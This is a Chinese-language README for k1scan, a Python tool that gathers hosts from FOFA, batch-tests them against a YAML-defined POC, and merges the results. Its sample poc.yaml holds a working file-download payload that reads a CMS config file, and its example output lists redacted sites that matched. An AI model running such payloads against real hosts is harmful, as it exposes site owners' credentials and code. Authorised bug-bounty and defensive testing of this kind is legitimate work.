# k1scan

FOFA Get only host, POC Batch testing, merge&amp;dedup

为了刷公益 SRC 诞生的小工具

使用示例参考: <https://www.yuque.com/ky1in7/blog/cxe3d5>

## ⭐️ 主要功能

1. FOFA信息收集
   - 仅保留 host 字段, 保存为 txt 格式
2. POC 批量检测
   - 基于 poc.yaml 配置文件
   - 支持字段: method, path, timeout
3. 数据合并/去重
   - 对 results 文件夹内数据合并去重

## 🚀 快速开始

- **使用 FOFA 信息收集请检查 `api.yaml` 配置文件是否正确**

- **使用 POC 批量检测请检查 `poc.yaml` 配置文件是否正确**

### 1. 安装步骤

```bash
git clone https://github.com/ky1in7/k1scan.git ./k1scan
cd k1scan
python -m pip install -r requirements.txt
```

### 2. 配置文件

- api.yaml (FOFA信息收集)

```yaml
fofa_api:
  fofa_email: 填入fofa email
  fofa_key: 填入 fofa key
```

- poc.yaml (POC批量检测)

```yaml
request:
  # 请求方式 GET/POST
  method: get
  # 请求路径
  path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
  # 超时时间
  timeout: 5
response:
  # 若存在漏洞响应包中包含的任意内容
  hit_content: <?php
```

### 3. 使用示例

```bash
> python main.py

[1] FOFA数据采集
[2] POC 批量检测
[3] 爱站-权重查询 (未实现)
[4] 数据合并/去重
```

参考 <https://www.yuque.com/ky1in7/blog/cxe3d5>

## 📌 补充说明

1. FOFA信息收集

```bash
python main.py

[1] FOFA数据采集
[2] POC 批量检测
[3] 爱站-权重查询 (未实现)
[4] 数据合并/去重

# 选择语句
请输入选项 1/2/3/4: 1
请输入 FOFA 规则语句: asd123
请求链接: [https://fofa.info/api/v1/search/all?email=***&key=***&qbase64=YXNkMTIz&fields=host&size=10000]
请求规则: [asd123]
共返回: [745] 条数据
# 是否保存 (默认为 N)
是否保存数据?[y/N]:y
=== 文件将保存为 txt 格式文件 ===
=== 数据类型为: <class 'list'> ===
# 选择语句 (结尾带不带 txt 都行)
请输入保存文件名称: fofa_search_xxx.txt
[Success] 保存成功, 文件路径: ./results/fofa_search_xxx.txt
```

2. POC 批量检测

```bash
python main.py

[1] FOFA数据采集
[2] POC 批量检测
[3] 爱站-权重查询
[4] 数据合并/去重

# 选择语句
请输入选项 1/2/3/4: 2
# 选择检测的 url 文件名称, 必须存放在 results 目录下
请将文件放在 results 目录下, 并输入文件名称: qibo.txt
=== [以下为命中结果] ===
http://www.*******.com
http://www.******.com
http://******.com
http://******
http://******
http://www.******.com
http://bf.******.cn
http://m.******.com
http://******.******.******.com
http://www.******.com
http://******
```

3. 数据合并/去重

其实暂时只完成了合并, 输入保存名称后执行自动合并 results 目录下的所有文件

```bash
# 统计所有原文件行数
> wc results/*
    7192    7192  144864 results/******1.txt
    4482    4482   89230 results/******2.txt
    4130    4130   91867 results/******3.txt
    3484    3484   76138 results/******4.txt
   19288   19288  402099 results/******_all.txt
     745     745   15316 results/******.txt
    2706    2706   58357 results/***.txt
      36      36     771 results/***_result.txt
       2       3      48 results/*****.txt
   42065   42066  878690 total

> python main.py

[1] FOFA数据采集
[2] POC 批量检测
[3] 爱站-权重查询 (未实现)
[4] 数据合并/去重

请输入选项 1/2/3/4: 4
将对 results 内所有结果进行排序去重
是否进行操作?[y/N]:y
输入保存的新文件名: :alll.txt
- 读取到 ['xxx.txt', 'xxxxx.txt', 'xxxxx.txt', 'xxxxx.txt', 'xxxxx.txt', 'xxxxx.txt', 'xxxx.txt', 'xxx.txt', 'xxxxxx.txt'], 共 [9] 个文件
写入成功, 文件路径为 [results/alll.txt], 共 41901 条结果

# 统计合并后文件行数
wc results/alll.txt
   42065   42065  878690 results/alll.txt
```

### 关于权重查询

太麻烦了, 暂时没时间写, 先搁置

手动查权重的两个站点
- <https://rank.chinaz.com/all>
- <https://www.aizhan.com/>

## 免责声明

> 维护网络安全，营造良好的网络环境，程序仅供参考学习，请勿使用文中技术于非法用途，使用者造成任何负面影响与本人无关。